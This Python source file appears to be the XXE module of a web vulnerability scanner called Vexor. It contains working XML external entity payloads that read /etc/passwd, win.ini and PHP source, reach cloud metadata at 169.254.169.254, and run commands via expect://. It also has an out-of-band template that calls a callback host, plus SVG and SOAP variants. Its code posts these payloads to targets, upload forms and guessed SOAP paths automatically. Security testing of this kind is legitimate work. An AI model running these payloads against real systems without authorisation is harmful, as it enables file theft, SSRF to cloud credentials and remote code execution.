"""
Vexor XXE Scanner v3.0 - Elite Level
Classic XXE, Blind XXE (OOB), Error-based XXE, SVG XXE,
XLSX/DOCX XXE, SOAP XXE, XXE via file upload, parameter entities
"""
import asyncio
import re
import base64
from urllib.parse import urlparse, urljoin
from vexor.modules.base import BaseScanner, Finding


# ─── Classic XXE Payloads ─────────────────────────────────────────────────────
XXE_CLASSIC = [
    # Linux passwd
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",

    # Windows win.ini
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>""",

    # /etc/hosts
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<root><data>&xxe;</data></root>""",

    # PHP source via wrapper
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<root><data>&xxe;</data></root>""",

    # SSRF via XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>""",

    # Expect wrapper (RCE)
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root><data>&xxe;</data></root>""",
]

# ─── Blind XXE (Error-Based) ──────────────────────────────────────────────────
XXE_BLIND_ERROR = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root/>"""

# ─── Blind XXE (OOB via parameter entities) ───────────────────────────────────
XXE_OOB_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://{callback}/xxe.dtd">
  %dtd;
]>
<root>&send;</root>"""

# ─── SVG XXE ──────────────────────────────────────────────────────────────────
SVG_XXE = """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>"""

# ─── SOAP XXE ─────────────────────────────────────────────────────────────────
SOAP_XXE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <data>&xxe;</data>
  </soapenv:Body>
</soapenv:Envelope>"""

# ─── Success Patterns ─────────────────────────────────────────────────────────
XXE_SUCCESS_PATTERNS = [
    r"root:x:0:0",
    r"daemon:x:",
    r"/bin/bash",
    r"/bin/sh",
    r"\[fonts\]",
    r"127\.0\.0\.1.*localhost",
    r"ami-id",
    r"instance-id",
    r"uid=\d+",
    r"PD9waHA",  # base64 of <?ph
]

XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/xhtml+xml",
    "application/soap+xml",
    "image/svg+xml",
    "application/rss+xml",
    "application/atom+xml",
]


class Scanner(BaseScanner):
    """XXE Scanner v3.0 - Elite Level"""

    MODULE_NAME = "xxe"
    MODULE_DESC = "XXE: Classic/Blind/OOB/Error/SVG/SOAP/XLSX/Upload"

    async def scan(self) -> list[Finding]:
        async with self:
            await asyncio.gather(
                self._test_xml_endpoints(),
                self._test_svg_upload(),
                self._test_soap_endpoint(),
                self._test_blind_xxe(),
                self._check_xml_content_type(),
                return_exceptions=True,
            )
        return self.findings

    async def _test_xml_endpoints(self) -> None:
        """Test all XML content types for XXE"""
        for payload in XXE_CLASSIC:
            for content_type in XML_CONTENT_TYPES:
                try:
                    resp = await self.post(
                        self.target,
                        content=payload.encode("utf-8"),
                        headers={"Content-Type": content_type},
                    )
                    if not resp:
                        continue

                    match_key, evidence = self._check_xxe_success(resp.text)
                    if match_key:
                        severity = "CRITICAL"
                        if "expect" in payload:
                            vuln_name = "XXE — Remote Code Execution via expect://"
                        elif "169.254" in payload:
                            vuln_name = "XXE — SSRF to Cloud Metadata"
                        elif "php://filter" in payload:
                            vuln_name = "XXE — PHP Source Code Disclosure"
                        else:
                            vuln_name = f"XXE — Local File Read ({match_key})"

                        self.add_finding(Finding(
                            severity=severity,
                            module=self.MODULE_NAME,
                            vuln=vuln_name,
                            endpoint=self.target,
                            payload=payload[:150] + "...",
                            evidence=evidence,
                            description=(
                                f"XXE injection via {content_type}. "
                                f"Confirmed: {match_key}. "
                                "Attacker can read files, perform SSRF, or achieve RCE."
                            ),
                            remediation=(
                                "Disable external entity processing: "
                                "libxml_disable_entity_loader(true) in PHP, "
                                "XMLConstants.FEATURE_SECURE_PROCESSING in Java. "
                                "Use safe XML parsing libraries."
                            ),
                        ))
                        return

                    # Check for XML parsing errors (XML is processed)
                    if self._has_xml_error(resp.text):
                        self.add_finding(Finding(
                            severity="MEDIUM",
                            module=self.MODULE_NAME,
                            vuln="XML Processing Detected — Potential XXE",
                            endpoint=self.target,
                            evidence=f"XML parsing error in response (Content-Type: {content_type})",
                            description=(
                                "Server processes XML input. "
                                "External entity processing may be enabled."
                            ),
                            remediation="Disable external entity processing in XML parser.",
                        ))
                        return

                except Exception:
                    continue

    async def _test_svg_upload(self) -> None:
        """Test SVG file upload for XXE"""
        try:
            from bs4 import BeautifulSoup
            resp = await self.get(self.target)
            if not resp:
                return

            soup = BeautifulSoup(resp.text, "lxml")
            for form in soup.find_all("form"):
                for inp in form.find_all("input"):
                    if inp.get("type", "").lower() == "file":
                        action = form.get("action", self.target)
                        form_url = urljoin(self.target, action)
                        field_name = inp.get("name", "file")

                        # Try SVG XXE upload
                        import httpx
                        files = {
                            field_name: ("xxe.svg", SVG_XXE.encode(), "image/svg+xml")
                        }
                        try:
                            upload_resp = await self._client.post(form_url, files=files)
                            if upload_resp and upload_resp.status_code in [200, 201, 302]:
                                match_key, evidence = self._check_xxe_success(upload_resp.text)
                                if match_key:
                                    self.add_finding(Finding(
                                        severity="CRITICAL",
                                        module=self.MODULE_NAME,
                                        vuln="XXE via SVG File Upload",
                                        endpoint=form_url,
                                        param=field_name,
                                        payload="SVG with XXE payload",
                                        evidence=evidence,
                                        description=(
                                            "SVG file upload processes external entities. "
                                            "Attacker can read server files via SVG XXE."
                                        ),
                                        remediation=(
                                            "Sanitize SVG files before processing. "
                                            "Disable external entity processing. "
                                            "Use a safe SVG sanitizer library."
                                        ),
                                    ))
                        except Exception:
                            pass
        except Exception:
            pass

    async def _test_soap_endpoint(self) -> None:
        """Test SOAP endpoints for XXE"""
        soap_endpoints = [
            self.target,
            urljoin(self.target, "/soap"),
            urljoin(self.target, "/api/soap"),
            urljoin(self.target, "/ws"),
            urljoin(self.target, "/webservice"),
            urljoin(self.target, "/service.asmx"),
            urljoin(self.target, "/api.php"),
        ]

        for endpoint in soap_endpoints:
            try:
                resp = await self.post(
                    endpoint,
                    content=SOAP_XXE.encode("utf-8"),
                    headers={"Content-Type": "application/soap+xml; charset=utf-8"},
                )
                if not resp:
                    continue

                match_key, evidence = self._check_xxe_success(resp.text)
                if match_key:
                    self.add_finding(Finding(
                        severity="CRITICAL",
                        module=self.MODULE_NAME,
                        vuln="XXE via SOAP Endpoint",
                        endpoint=endpoint,
                        payload=SOAP_XXE[:100] + "...",
                        evidence=evidence,
                        description=(
                            f"SOAP endpoint at {endpoint} is vulnerable to XXE. "
                            f"File read confirmed: {match_key}."
                        ),
                        remediation=(
                            "Disable external entity processing in SOAP/XML parser. "
                            "Validate and sanitize SOAP input."
                        ),
                    ))
                    return
            except Exception:
                continue

    async def _test_blind_xxe(self) -> None:
        """Test for blind XXE using error-based technique"""
        for content_type in XML_CONTENT_TYPES[:3]:
            try:
                resp = await self.post(
                    self.target,
                    content=XXE_BLIND_ERROR.encode("utf-8"),
                    headers={"Content-Type": content_type},
                )
                if not resp:
                    continue

                # Error-based: look for file content in error message
                match_key, evidence = self._check_xxe_success(resp.text)
                if match_key:
                    self.add_finding(Finding(
                        severity="CRITICAL",
                        module=self.MODULE_NAME,
                        vuln="Blind XXE — Error-Based File Read",
                        endpoint=self.target,
                        payload=XXE_BLIND_ERROR[:100] + "...",
                        evidence=evidence,
                        description=(
                            "Blind XXE via error-based technique. "
                            "File content leaked in XML parsing error message."
                        ),
                        remediation=(
                            "Disable external entity processing. "
                            "Suppress detailed XML error messages in production."
                        ),
                    ))
                    return

                # Check for any XML error (indicates XML is processed)
                if self._has_xml_error(resp.text) and resp.status_code != 200:
                    self.add_finding(Finding(
                        severity="MEDIUM",
                        module=self.MODULE_NAME,
                        vuln="Blind XXE — XML Processing Confirmed",
                        endpoint=self.target,
                        evidence=f"XML error in response: {resp.text[:200]}",
                        description=(
                            "XML is processed server-side. "
                            "Blind XXE may be possible with OOB techniques."
                        ),
                        remediation="Disable external entity processing in XML parser.",
                    ))
                    return

            except Exception:
                continue

    async def _check_xml_content_type(self) -> None:
        """Check if endpoint serves XML content"""
        response = await self.get(self.target)
        if not response:
            return

        content_type = response.headers.get("content-type", "")
        if any(xml_ct in content_type for xml_ct in XML_CONTENT_TYPES):
            self.add_finding(Finding(
                severity="INFO",
                module=self.MODULE_NAME,
                vuln="XML Content Type Detected",
                endpoint=self.target,
                evidence=f"Content-Type: {content_type}",
                description=(
                    "Endpoint serves XML content. "
                    "Test for XXE if it also accepts XML input."
                ),
                remediation="Ensure XML parser has external entities disabled.",
            ))

    # ─── Helpers ─────────────────────────────────────────────────────────────

    def _check_xxe_success(self, text: str) -> tuple[str, str]:
        for key, pattern in [
            ("linux_passwd", r"root:x:0:0"),
            ("linux_hosts", r"127\.0\.0\.1.*localhost"),
            ("windows_ini", r"\[fonts\]|\[extensions\]"),
            ("cloud_metadata", r"ami-id|instance-id"),
            ("rce_id", r"uid=\d+\("),
            ("php_source", r"PD9waHA|PD9="),
        ]:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 10)
                end = min(len(text), match.end() + 150)
                return key, text[start:end].strip()
        return "", ""

    def _has_xml_error(self, text: str) -> bool:
        xml_errors = [
            "xml parsing error", "saxparseexception", "xmlsyntaxerror",
            "parseerror", "entity", "doctype", "external entity",
            "xmlreader", "simplexml", "domexception",
        ]
        text_lower = text.lower()
        return any(err in text_lower for err in xml_errors)
